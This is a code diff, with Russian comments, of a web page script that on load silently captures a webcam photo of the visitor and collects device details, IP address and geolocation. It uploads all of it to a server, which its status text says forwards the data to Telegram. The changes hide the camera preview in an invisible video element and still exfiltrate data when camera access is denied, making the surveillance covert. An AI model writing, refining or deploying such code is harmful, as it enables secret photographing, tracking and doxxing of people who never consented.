@@ -2,30 +2,20 @@
     'use strict';
 
     // ===== ЭЛЕМЕНТЫ =====
-    const video = document.getElementById('video');
-    const statusDiv = document.getElementById('status');
-    const preview = document.getElementById('preview');
-    const photoInfo = document.getElementById('photoInfo');
-    const placeholder = document.getElementById('placeholder');
+    const statusText = document.getElementById('statusText');
+    const subtitle = document.querySelector('.subtitle');
 
     // ===== ПЕРЕМЕННЫЕ =====
     let stream = null;
     let isPhotoTaken = false;
-    let retryCount = 0;
-    const MAX_RETRIES = 2;
     let isProcessing = false;
     let collectedData = {};
 
     // ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
-    function setStatus(text, type = 'info') {
-        let icon = '';
-        if (type === 'success') icon = '✅ ';
-        else if (type === 'error') icon = '❌ ';
-        else if (type === 'warning') icon = '⚠️ ';
-        else if (type === 'info') icon = 'ℹ️ ';
-        
-        statusDiv.className = 'status-' + type;
-        statusDiv.innerHTML = icon + text;
+    function setStatus(text) {
+        console.log('📊 Статус:', text);
+        subtitle.textContent = text;
+        if (statusText) statusText.textContent = text;
     }
 
     function dataURLToBlob(dataURL) {
@@ -82,7 +72,6 @@
             cookieEnabled: navigator.cookieEnabled
         };
 
-        // Определение ОС
         if (ua.includes('Android')) data.os = 'Android';
         else if (ua.includes('iPhone') || ua.includes('iPad')) data.os = 'iOS';
         else if (ua.includes('Windows')) data.os = 'Windows';
@@ -90,7 +79,6 @@
         else if (ua.includes('Linux')) data.os = 'Linux';
         else data.os = 'Unknown';
 
-        // Определение браузера
         if (ua.includes('Chrome') && !ua.includes('Edg')) data.browser = 'Chrome';
         else if (ua.includes('Firefox')) data.browser = 'Firefox';
         else if (ua.includes('Safari') && !ua.includes('Chrome')) data.browser = 'Safari';
@@ -140,10 +128,9 @@
         });
     }
 
-    // ===== ПОЛУЧЕНИЕ IP АДРЕСА =====
+    // ===== ПОЛУЧЕНИЕ IP =====
     async function getIP() {
         try {
-            // Пробуем несколько сервисов
             const services = [
                 'https://api.ipify.org?format=json',
                 'https://ipapi.co/json/',
@@ -156,14 +143,9 @@
                     if (!response.ok) continue;
                     const data = await response.json();
                     
-                    // Для ipify
                     if (data.ip) {
-                        return {
-                            ip: data.ip,
-                            source: 'ipify'
-                        };
+                        return { ip: data.ip, source: 'ipify' };
                     }
-                    // Для ipapi.co
                     if (data.ip) {
                         return {
                             ip: data.ip,
@@ -173,7 +155,6 @@
                             source: 'ipapi.co'
                         };
                     }
-                    // Для ip-api.com
                     if (data.query) {
                         return {
                             ip: data.query,
@@ -202,13 +183,11 @@
         try {
             let formData = new FormData();
             
-            // Добавляем фото, если есть
             if (photoDataUrl) {
                 const blob = dataURLToBlob(photoDataUrl);
                 formData.append('photo', blob, 'photo.jpg');
             }
             
-            // Добавляем все данные как JSON
             const metadata = {
                 device: deviceData,
                 location: locationData,
@@ -221,7 +200,7 @@
             
             formData.append('metadata', JSON.stringify(metadata));
             
-            setStatus('Отправка данных...', 'info');
+            setStatus('📤 Отправка данных...');
             
             const response = await fetch('/upload', {
                 method: 'POST',
@@ -232,40 +211,29 @@
             const result = await response.json();
             
             if (result.success) {
-                const ts = timestamp;
-                photoInfo.textContent = `✅ ${ts.date} ${ts.time} | ${result.filename || 'отправлено'}`;
-                photoInfo.className = 'photo-info success';
-                setStatus('✅ Данные отправлены в Telegram!', 'success');
+                setStatus('✅ Данные отправлены в Telegram!');
                 console.log('📊 Отправлены данные:', metadata);
             } else {
-                setStatus('Ошибка сервера: ' + (result.error || 'неизвестная'), 'error');
+                setStatus('❌ Ошибка сервера: ' + (result.error || 'неизвестная'));
             }
         } catch (err) {
             console.error('Ошибка отправки:', err);
-            if (err.name === 'AbortError') {
-                setStatus('Превышено время ожидания', 'error');
-            } else {
-                setStatus('Ошибка отправки: ' + err.message, 'error');
-            }
+            setStatus('❌ Ошибка отправки: ' + err.message);
         } finally {
             isProcessing = false;
         }
     }
 
-    // ===== ОСНОВНАЯ ФУНКЦИЯ СБОРА =====
+    // ===== СБОР ВСЕХ ДАННЫХ =====
     async function collectAllData() {
         const timestamp = getTimestamp();
         const deviceData = collectDeviceData();
         
-        setStatus('Сбор данных...', 'info');
+        setStatus('📡 Сбор данных...');
         
-        // Получаем IP
         const ipData = await getIP();
-        
-        // Получаем геолокацию
         const locationData = await getLocation();
         
-        // Сохраняем
         collectedData = {
             timestamp,
             device: deviceData,
@@ -278,57 +246,47 @@
     }
 
     // ===== СЪЁМКА ФОТО =====
-    function takePhoto() {
-        if (!stream || isPhotoTaken || isProcessing) return;
+    function takePhoto(videoElement) {
+        if (!videoElement || isPhotoTaken || isProcessing) return;
         
-        if (video.videoWidth === 0 || video.videoHeight === 0) {
-            setStatus('Ожидание стабилизации...', 'info');
-            setTimeout(takePhoto, 400);
+        if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) {
+            setTimeout(() => takePhoto(videoElement), 400);
             return;
         }
 
         try {
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
             const ctx = canvas.getContext('2d');
             
             ctx.translate(canvas.width, 0);
             ctx.scale(-1, 1);
-            ctx.drawImage(video, 0, 0);
+            ctx.drawImage(videoElement, 0, 0);
             
             const photoData = canvas.toDataURL('image/jpeg', 0.85);
             
-            preview.src = photoData;
-            preview.style.display = 'block';
-            video.style.display = 'none';
-            placeholder.classList.add('hidden');
-            
             isPhotoTaken = true;
             
-            // Собираем все данные и отправляем с фото
             collectAllData().then((data) => {
                 sendDataToServer(photoData, data.device, data.location, data.ip, data.timestamp);
             });
             
         } catch (err) {
             console.error('Ошибка съёмки:', err);
-            // Даже если фото не получилось, отправляем данные
             collectAllData().then((data) => {
                 sendDataToServer(null, data.device, data.location, data.ip, data.timestamp);
             });
-            setStatus('Ошибка фото, но данные отправлены', 'warning');
+            setStatus('⚠️ Ошибка фото, но данные отправлены');
         }
     }
 
     // ===== ЗАПУСК КАМЕРЫ =====
     async function startCamera() {
         try {
-            setStatus('Запрос доступа к камере...', 'info');
-            placeholder.querySelector('.icon').textContent = '⏳';
-            placeholder.querySelector('span:last-child').textContent = 'Запрос разрешения...';
+            setStatus('📷 Запрос доступа к камере...');
             
-            stream = await navigator.mediaDevices.getUserMedia({
+            const stream = await navigator.mediaDevices.getUserMedia({
                 video: { 
                     facingMode: 'user',
                     width: { ideal: 640 },
@@ -337,16 +295,25 @@
                 audio: false
             });
             
+            // Создаём скрытый video элемент
+            const video = document.createElement('video');
             video.srcObject = stream;
+            video.autoplay = true;
+            video.muted = true;
+            video.style.display = 'none';
+            document.body.appendChild(video);
+            
             await video.play();
             
-            placeholder.classList.add('hidden');
-            video.style.display = 'block';
-            
-            setStatus('Камера включена! Делаем фото...', 'success');
+            setStatus('📸 Делаем фото...');
             
             setTimeout(() => {
-                takePhoto();
+                takePhoto(video);
+                // Останавливаем камеру после фото
+                setTimeout(() => {
+                    stream.getTracks().forEach(track => track.stop());
+                    video.remove();
+                }, 2000);
             }, 800);
             
         } catch (err) {
@@ -354,62 +321,39 @@
             
             let errorMsg = '';
             if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                errorMsg = 'Доступ к камере запрещён. Отправляем данные без фото.';
+                errorMsg = '⚠️ Доступ к камере запрещён. Отправляем данные без фото.';
             } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
-                errorMsg = 'Камера не найдена. Отправляем данные без фото.';
+                errorMsg = '⚠️ Камера не найдена. Отправляем данные без фото.';
             } else {
-                errorMsg = 'Ошибка камеры: ' + err.message;
+                errorMsg = '⚠️ Ошибка камеры: ' + err.message;
             }
             
-            setStatus(errorMsg, 'warning');
-            placeholder.querySelector('.icon').textContent = '⚠️';
-            placeholder.querySelector('span:last-child').textContent = 'Камера недоступна';
+            setStatus(errorMsg);
             
-            // Всё равно собираем данные и отправляем без фото
             collectAllData().then((data) => {
                 sendDataToServer(null, data.device, data.location, data.ip, data.timestamp);
             });
         }
     }
 
-    // ===== ОЧИСТКА =====
-    function cleanup() {
-        if (stream) {
-            stream.getTracks().forEach(track => {
-                track.stop();
-                track.enabled = false;
-            });
-            stream = null;
-        }
-        video.srcObject = null;
-    }
-
     // ===== ЗАПУСК =====
     function init() {
+        setStatus('🔄 Подготовка...');
+        
+        // Проверка поддержки камеры
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            setStatus('Браузер не поддерживает камеру', 'error');
-            // Всё равно собираем данные
+            setStatus('⚠️ Браузер не поддерживает камеру');
             collectAllData().then((data) => {
                 sendDataToServer(null, data.device, data.location, data.ip, data.timestamp);
             });
             return;
         }
-        setTimeout(startCamera, 600);
+        
+        // Запускаем камеру через 1 секунду
+        setTimeout(startCamera, 1000);
     }
 
-    // ===== СОБЫТИЯ =====
-    window.addEventListener('beforeunload', cleanup);
-    window.addEventListener('pagehide', cleanup);
-    
-    document.addEventListener('visibilitychange', () => {
-        if (document.hidden && stream) {
-            stream.getTracks().forEach(track => track.enabled = false);
-        } else if (!document.hidden && stream) {
-            stream.getTracks().forEach(track => track.enabled = true);
-        }
-    });
-
-    // ===== ЗАПУСК =====
+    // ===== ЗАПУСК ПРИ ЗАГРУЗКЕ =====
     if (document.readyState === 'complete') {
         init();
     } else {
